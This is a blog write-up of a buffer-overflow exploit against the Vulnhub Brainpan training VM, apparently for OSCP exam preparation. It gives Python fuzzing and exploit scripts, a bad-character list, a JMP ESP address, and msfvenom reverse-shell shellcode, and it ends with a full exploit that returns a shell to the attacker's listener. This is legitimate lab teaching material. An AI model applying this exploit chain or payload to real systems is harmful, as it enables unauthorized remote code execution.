---
layout: post
title:  "Vulnhub Brainpan writeup (OSCP guide to BoF)"
date:   2019-12-18 17:34:14 -0400
featured_img: "/assets/brainpan.png"
categories: BoF oscp
---


![Brainpan](/assets/brainpan/brainpan.png)

[https://www.vulnhub.com/entry/brainpan-1,51/]

This is a very good machine to practice Buffer Overflow before OSCP exam.

This machine has ports 9999 and 10000 running. The application that we will try to overflow is running on port 9999.

But on port 10000 we can get the file itself. It resides here `http://IP-OF-Brainpan-VM:10000/bin/`

Simply download the `brainpan.exe` file

We will be using OllyDbg here. It is already preinstalled on Kali. Through first start maybe lenghty and may require installation of some libs.

Ok. So let's start OllyDbg by typing `ollydbg` in terminal.

You are suppose to see something like this.

![OllyDbg](/assets/brainpan/ollydbg.png)

Now click File -> Open and choose the `brainpan.exe` file

![Open file in OllyDbg](/assets/brainpan/open.png)

We also need to run the file, so let's click the play button to start the application

![Start exe](/assets/brainpan/start.png)

We can see that application is running and waiting for connections.

![App running](/assets/brainpan/running.png)

OK, great. So now we will create a python file `fuzz.py` and will try to figure out where we have Buffer Overflow.

{% highlight python %}
#!/usr/bin/python

import socket

buffer=["A"]
counter=100

while len(buffer) <= 100:
    buffer.append("A"*counter)
    counter=counter+100 #increment by 100

try:
    for string in buffer:
        print "We are fuzzing with a length of %s bytes" % len(string)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect(('127.0.0.1', 9999))
        s.recv(1024)
        s.send(string + '\r\n')
        s.close()


    print"\nDone!"
    buffer += 200
except:
    print "Could not connect ..."
{% endhighlight %}

Send fuzz to our application

`python fuzz.py`

![fuzz](/assets/brainpan/fuzz.png) 

It crashed around 600 bytes


Now we need to create a patern of unique symbols

For this we will use Pattern_create

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`

![pattern](/assets/brainpan/pattern.png)

Now we need to create a new python script

We will name it fuzzer.py

{% highlight python %}
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9'
#"A" * 600


try:
    print "\nSending buffer.."
    s.connect(('127.0.0.1', 9999))
    data = s.recv(1024)

    s.send(buffer + '\r\n')

    print"\nOverflowed!"
except:
    print "Could not connect ..."
{% endhighlight %}

As you can see we added sequence of the generated symbols to it.

Now run this file

![fuzzer](/assets/brainpan/fuzzer.png)

Our app crashed

![fuzzer](/assets/brainpan/crashed_sequence.png)

So now, let's go to OllyDbg

We are interested in EIP field here.

![EIP](/assets/brainpan/eip_seq.png)

It is `35724134`

Cool.

We will use `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb` to figure out where exactly it failed.

run `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134`

We got offset `524`

![Offset](/assets/brainpan/offset.png)

Great. We need to create another python file - fuzzer2.py (you can simply update your existing file, but I prefer to separate them)

{% highlight python %}
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'A'*524 + 'B'*4 + 'C'*(600-524-4)
#"A" * 600

try:
    print "\nSending buffer.."
    s.connect(('127.0.0.1', 9999))
    data = s.recv(1024)

    s.send(buffer + '\r\n')

    print"\nOverflowed!"
except:
    print "Could not connect ..."

{% endhighlight %}

So what we did here? We will now send 524 'A' symbols to our app plus we will send 4 'B' symbols and all other symbols will be 'C' so we end up sending 600 symbols.

Let's restart our application. Remember, we have to do it everytime we crash it.

Now run `python fuzzer2.py`

Great. We see our stuff in the app

![ABC](/assets/brainpan/abc.png)

Now open OllyDbg

![BBBB](/assets/brainpan/42424242.png)

our EIP is `42424242` This means we ovveride EIP with our 'B' symbols. And this is exactly what we want here meaning we sent the correct number of A and B symbols.
the space we used for 'C' symbol is where we will place our shell. We will not be able to put our shell in such a small space so we will try to make it bigger meaning we will now try to send a bigger buffer.

Our next step is to look for bad symbols before we generate our reverse shell.

Proposed resource
[https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py]

So, these are our bad symbols we will now place them in the new python file. But will remove \00 because for sure it will not work.

badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

Create fuzzer3.py

{% highlight python %}
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = 'A'*524 + 'B'*4 + badchars
#'C'*(1500-524-4)
#"A" * 600

try:
    print "\nSending buffer.."
    s.connect(('127.0.0.1', 9999))
    data = s.recv(1024)

    s.send(buffer + '\r\n')

    print"\nOverflowed!"
except:
    print "Could not connect ..."

{% endhighlight %}

Now restart the application and run `python fuzzer3.py`

open OllyDbg

Right click on ESP and select "Follow in Dump"

![Dump](/assets/brainpan/dump.png)

and now explore carefully if all the symbols you sent are displayed.

![Bad Symbols](/assets/brainpan/find_bad_symbols.png)

Looks like all of them are displayed. But you must be sure. Because if you miss some bad symbol our shell will not work.

Next step is to figure out `JMP ESP` This is the address that will execute our code.

We can simply search for it.

Open OllyDbg again, restart app and search.

Right click -> Search for -> All commands

![Search 1](/assets/brainpan/search1.png)

type `JMP ESP`

![Search 2](/assets/brainpan/search2.png)

And we found it

![Search 3](/assets/brainpan/search3.png)


Copy address `311712F3`

Now, this is important. There should not be `00` in this address or it will not work. If this is the case you want to check for `JMP ESP` inside dll files you may have.

Simply open dll file, run it and search for `JMP ESP` or `CALL ESP` and copy the address you found there.


Cool. Next step is to generate our shell code using `msfvenom`

Run `msfvenom -p linux/x86/shell_reverse_tcp -b \x00 LHOST=192.168.2.29 LPORT=8080 -f python`

![Generated code](/assets/brainpan/generated.png)

Let's explain: so -b \x00 means we want to exclude \x00 symbol
lhost is IP of our Kali
lport is port on which we will be listening for reverse shell

{% highlight python %}
buf =  b""
buf += b"\xda\xc7\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\xb8\xb5"
buf += b"\xcc\xd6\xc2\x31\x43\x17\x03\x43\x17\x83\x76\xc8\x34"
buf += b"\x37\x49\x0a\x4f\x5b\xfa\xef\xe3\xf6\xfe\x66\xe2\xb7"
buf += b"\x98\xb5\x65\x24\x3d\xf6\x59\x86\x3d\xbf\xdc\xe1\x55"
buf += b"\x80\xb7\x10\xb8\x68\xca\x14\xdd\xf8\x43\xf5\x51\x9e"
buf += b"\x03\xa7\xc2\xec\xa7\xce\x05\xdf\x28\x82\xad\x8e\x07"
buf += b"\x50\x45\x27\x77\xb9\xf7\xde\x0e\x26\xa5\x73\x98\x48"
buf += b"\xf9\x7f\x57\x0a"
{% endhighlight %}

we need to add this code to our new `fuzzer4.py` file

Now, besides adding our generated shell we also need to add `JMP ESP` address, but put it in reverse order (little endian format).

So `311712F3` will become `\xF3\x12\x17\x31`

We will also add NOP. 15 symbols should be good.

{% highlight python %}
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf =  b""
buf += b"\xda\xc7\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\xb8\xb5"
buf += b"\xcc\xd6\xc2\x31\x43\x17\x03\x43\x17\x83\x76\xc8\x34"
buf += b"\x37\x49\x0a\x4f\x5b\xfa\xef\xe3\xf6\xfe\x66\xe2\xb7"
buf += b"\x98\xb5\x65\x24\x3d\xf6\x59\x86\x3d\xbf\xdc\xe1\x55"
buf += b"\x80\xb7\x10\xb8\x68\xca\x14\xdd\xf8\x43\xf5\x51\x9e"
buf += b"\x03\xa7\xc2\xec\xa7\xce\x05\xdf\x28\x82\xad\x8e\x07"
buf += b"\x50\x45\x27\x77\xb9\xf7\xde\x0e\x26\xa5\x73\x98\x48"
buf += b"\xf9\x7f\x57\x0a"

nop = '\x90'*15

buffer = 'A'*524 + '\xF3\x12\x17\x31' + nop +  buf
#'B'*4 + badchars
#'C'*(1500-524-4)
#"A" * 600


try:
    print "\nSending buffer.."
    s.connect(('192.168.2.25', 9999))
    data = s.recv(1024)

    s.send(buffer + '\r\n')

    print"\nOverflowed!"
except:
    print "Could not connect ..."

{% endhighlight %}

Please also pay attention. We changed IP address from `127.0.0.1` to `192.168.2.25` which is the IP of the Brainpan VM.

Okay. Last step.

Run `python fuzzer4.py`

![Run fuzzer4](/assets/brainpan/run4.png)

And we got reverse shell

![Listen](/assets/brainpan/listen.png)

This machine requires privilege escalation but I will not cover it here as this is not the purpose of this article.


I found following videos extremly helpful.

From  Michael LaSalvia:

[Path to OSCP: Video 3: Part1][Brainpan1]

[Path to OSCP: Video 3: Part2][Brainpan2]

Using Immunity debugger with Mona:

[OSCP Preparation - Buffer Overflow Guide - Resolving Brainpan using Mona][Mona]

[Brainpan1]: https://www.youtube.com/watch?v=ohCY8CD6mSs
[Brainpan2]: https://www.youtube.com/watch?v=cr4m_-fC90Q
[Mona]: https://www.youtube.com/watch?v=RmpNQQwhDms


